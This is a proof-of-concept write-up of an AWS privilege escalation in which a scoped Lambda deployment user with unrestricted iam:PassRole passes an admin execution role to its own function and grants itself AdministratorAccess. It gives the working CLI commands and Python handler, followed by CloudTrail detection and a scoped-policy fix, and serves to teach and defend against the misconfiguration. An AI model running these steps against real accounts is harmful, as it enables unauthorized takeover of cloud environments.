# PoC: Confused Deputy Attack via iam:PassRole + Lambda

## Summary
The `dev-w` IAM user was granted `iam:PassRole` with `Resource: "*"` as part
of its Lambda deployment permissions. This allowed `dev-w` to pass any role
in the account — including `role-ops-admin`, an administrator-level execution
role — to a Lambda function it created and controlled. The Lambda function
executed with `role-ops-admin`'s full permissions, and used them to attach
`AdministratorAccess` directly to `dev-w` — escalating a scoped deployment
user to full admin without ever being explicitly granted that access.

This is a classic **confused deputy attack**: the Lambda service (the deputy)
was tricked into acting with more authority than the human who invoked it,
because the scope of `iam:PassRole` was never restricted to only the
legitimate execution role.

## Environment
- User: `dev-w` (deployment developer)
- Legitimate permissions: `lambda:CreateFunction`, `UpdateFunctionCode`,
  `InvokeFunction`, `GetFunction`, `ListFunctions`, `logs:*`, `apigateway:GET`
- Injected vulnerability: `iam:PassRole` on `Resource: "*"`
- Legitimate execution role: `role-data-processor` (scoped S3 read-only)
- Exploited execution role: `role-ops-admin` (AdministratorAccess)

## Attack steps

**1. Confirm current identity and permissions:**
aws sts get-caller-identity --profile dev-w
aws iam list-attached-user-policies --user-name dev-w --profile dev-w
Confirms `dev-w` has no admin access at baseline.

**2. Write the malicious Lambda function (`evilW.py`):**
```python
import boto3

def lambda_handler(event, context):
    iam = boto3.client('iam')
    iam.attach_user_policy(
        UserName='dev-w',
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
    return {
        'statusCode': 200,
        'body': 'Escalation complete — dev-w now has AdministratorAccess'
    }
```

This code runs as whatever execution role the Lambda function is assigned.
The key insight: `dev-w` wrote this code, but the *Lambda service* executes
it — using `role-ops-admin`'s permissions, not `dev-w`'s.

**3. Zip the function code:**
powershell Compress-Archive -Path evilW.py -DestinationPath evilW.zip -Force

**4. Deploy the function as `dev-w`, passing the admin role:**
aws lambda create-function --function-name escalation-test
--runtime python3.12 --role arn:aws:iam::<ACCOUNT_ID>:role/role-ops-admin
--handler evilW.lambda_handler --zip-file fileb://evilW.zip
--profile dev-w `
--region ap-south-1

This is the exploit: `dev-w` passes `role-ops-admin` — a role it has no
business touching — to its Lambda function. AWS allows this because
`iam:PassRole` is scoped to `Resource: "*"` rather than the specific
legitimate role ARN.

**5. Invoke the function:**
aws lambda invoke --function-name escalation-test --profile dev-w --region ap-south-1 output.json
type output.json

**Result:**
```json
{"statusCode": 200, "body": "Escalation complete — dev-w now has AdministratorAccess"}
```

![Lambda invocation result](../poc-ss/dev-w-lambda-invoke.png)

**6. Verify escalation independently via admin account:**

**Result:**
```json
{
    "AttachedPolicies": [
        {
            "PolicyName": "AdministratorAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
        }
    ]
}
```

![AdministratorAccess confirmed on dev-w](../poc-ss/dev-w-admin-confirmed.png)

## Impact
`dev-w`, a scoped Lambda deployment user with no IAM management permissions
of its own, achieved full `AdministratorAccess` by:
1. Writing malicious code into a Lambda function
2. Passing an admin-level execution role to that function (permitted because
   `iam:PassRole` was not scoped to a specific role ARN)
3. Invoking the function once — the Lambda service executed the code as
   `role-ops-admin`, which had the permissions to grant admin access

The human never directly called any admin API — the *service* did it on their
behalf. This is the confused deputy pattern: an intermediary (Lambda) is
tricked into misusing its authority.

## Detection
CloudTrail captured the `AttachUserPolicy` event under a surprising identity:

- **userIdentity.type:** `AssumedRole`
- **arn:** `arn:aws:sts::<ACCOUNT_ID>:assumed-role/role-ops-admin/escalation-test`
- **sessionIssuer.userName:** `role-ops-admin`

The `AttachUserPolicy` action was logged under the Lambda function's assumed
role (`role-ops-admin/escalation-test`), not under `dev-w` directly — because
it was the *Lambda service* calling the IAM API, not the human. This is the
same two-event correlation pattern as the `automator-r` scenario: to attribute
this back to `dev-w`, an investigator must find the `CreateFunction` event
(which shows `dev-w` as the caller and `role-ops-admin` as the passed role)
and correlate it to the `AttachUserPolicy` event via the shared function name
`escalation-test`.

![CloudTrail AttachUserPolicy event](../poc-ss/dev-w-cloudtrail.png)

## Remediation
Scope `iam:PassRole`'s `Resource` to only the specific legitimate execution
role this deployment user actually needs:

**Before (vulnerable):**
```json
{
  "Sid": "OverlyBroadPassRole",
  "Effect": "Allow",
  "Action": "iam:PassRole",
  "Resource": "*"
}
```

**After (fixed):**
```json
{
  "Sid": "ScopedPassRole",
  "Effect": "Allow",
  "Action": "iam:PassRole",
  "Resource": "arn:aws:iam::<ACCOUNT_ID>:role/role-data-processor"
}
```

With this fix, `dev-w` can still deploy Lambda functions using the legitimate
`role-data-processor` execution role — its actual job is unaffected. But
attempting to pass `role-ops-admin` (or any other role) now returns
`AccessDenied`, closing the confused deputy path entirely.

As defense-in-depth, a **permissions boundary** on `dev-w` capping its
maximum effective permissions would also prevent any Lambda function it
creates from ever being able to call `iam:AttachUserPolicy` on `dev-w`
itself — even if the execution role has broad IAM permissions.
